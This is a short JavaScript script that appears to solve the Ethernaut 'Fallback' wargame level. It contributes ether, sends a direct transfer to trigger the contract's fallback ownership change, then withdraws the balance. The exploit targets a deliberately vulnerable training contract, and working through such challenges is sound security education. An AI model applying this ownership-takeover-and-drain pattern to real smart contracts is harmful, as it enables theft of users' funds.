module.exports = async function({ artifacts, web3, ethernaut }) {
  const levelAddress = await ethernaut.createInstance('Fallback');
  const Fallback = artifacts.require('Fallback');
  const levelInstance = await Fallback.at(levelAddress);

  await levelInstance.contribute({ value: web3.utils.toWei('0.0001', 'ether') });
  await web3.eth.sendTransaction({
    from: await ethernaut.getSenderAddress(),
    to: levelAddress,
    value: web3.utils.toWei('0.0001', 'ether')
  });

  await levelInstance.withdraw();

  return ethernaut.submitInstance(levelAddress);
};